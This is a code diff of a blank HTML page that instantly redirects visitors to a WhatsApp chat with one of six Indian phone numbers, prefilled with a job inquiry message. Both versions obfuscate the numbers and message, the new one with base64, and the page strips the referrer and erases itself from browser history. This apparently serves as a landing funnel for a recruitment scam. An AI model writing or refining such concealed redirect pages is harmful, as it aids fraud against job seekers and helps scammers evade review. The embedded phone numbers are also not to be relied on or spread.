@@ -1,22 +1,77 @@
-<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title></title></head><body style="margin:0; background:#000;"> 
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title></title>
+  <meta name="referrer" content="no-referrer">
+</head>
+<body style="margin:0;background:#000">
 <script>
-/* Blank-page immediate redirect (obfuscated) */
+/*
+  Minimal, immediate redirect.
+  - Payload is base64-encoded JSON to hide numbers/message in source.
+  - ?n=1  => goes to first number; ?n=2 => second; else random.
+  - Uses location.replace so no history entry.
+*/
+
+// --- CONFIG: base64 payload (do not change unless you want new numbers/message) ---
+const b64 = "eyJudW1iZXJzIjpbIjkxODk1MzYwODExMzIiLCI5MTg4MTA3NzkwMDA2IiwiOTE5NjAyODU3NTc0IiwiOTE3MDIxMzc1OTI4IiwiOTE5OTk4NDU2OTg5IiwiOTE5MTYyMjMzNzkyIl0sIm1lc3NhZ2UiOiJDb3VsZCB5b3UgcGxlYXNlIGludHJvZHVjZSB0aGlzIGpvYiB0byBtZSBwYXRpZW50bHk_In0=";
+// Explanation: decoded => {"numbers":["918953608132","918810779006","919602857574","917021375928","919998456989","919162233792"],"message":"Could you please introduce this job to me patiently?"}
+
+// --- small helper functions ---
+function parsePayload() {
+  try {
+    const json = atob(b64);
+    return JSON.parse(json);
+  } catch (e) {
+    return { numbers: [], message: "" };
+  }
+}
+function getQueryParam(name) {
+  try {
+    const p = new URL(location.href).searchParams;
+    return p.get(name);
+  } catch(e) { return null; }
+}
+function buildWaLink(num, msg) {
+  const digits = ("" + num).replace(/[^0-9]/g, "");
+  return "https://wa.me/" + digits + "?text=" + encodeURIComponent(msg || "");
+}
+
+// --- main ---
 (function(){
-  // obfuscated data array (numbers + message)
-  var _ = [
-    "918953608132","918810779006","919602857574","917021375928","919998456989","919162233792",
-    "Could you please introduce this job to me patiently?",
-    "https://wa.me/","?text=","encodeURIComponent","length","random","floor","replace","location","replace"
-  ];
-  // reorder to hide original order
-  var nums = [_[5],_[4],_[3],_[2],_[1],_[0]];
-  var msg = _[6];
-  // choose index (random)
-  var idx = Math[_[11]](Math[_[10]]()*nums[_[9]]);
-  // build link
-  var url = _[7] + nums[idx] + _[8] + window[_[9+2]](msg);
-  // immediate replace (no history entry)
-  try { window[_[14]][_[15]](url); } catch(e) { window.location = url; }
+  const payload = parsePayload();
+  if(!payload.numbers || payload.numbers.length === 0) {
+    // nothing to do
+    return;
+  }
+
+  // choose index: if ?n=NUMBER provided and valid -> use it (1-based),
+  // otherwise pick random
+  var idx = null;
+  const qn = getQueryParam('n');
+  if(qn !== null) {
+    const n = parseInt(qn, 10);
+    if(!isNaN(n) && n >= 1 && n <= payload.numbers.length) {
+      idx = n - 1;
+    }
+  }
+  if(idx === null) {
+    idx = Math.floor(Math.random() * payload.numbers.length);
+  }
+
+  const finalUrl = buildWaLink(payload.numbers[idx], payload.message);
+
+  // tiny delay to allow browser to initialize; still effectively immediate
+  try {
+    // use replace so back button won't return to this page
+    setTimeout(function(){ location.replace(finalUrl); }, 50);
+  } catch(e) {
+    // fallback
+    location.href = finalUrl;
+  }
 })();
 </script>
-</body></html>
+</body>
+</html>
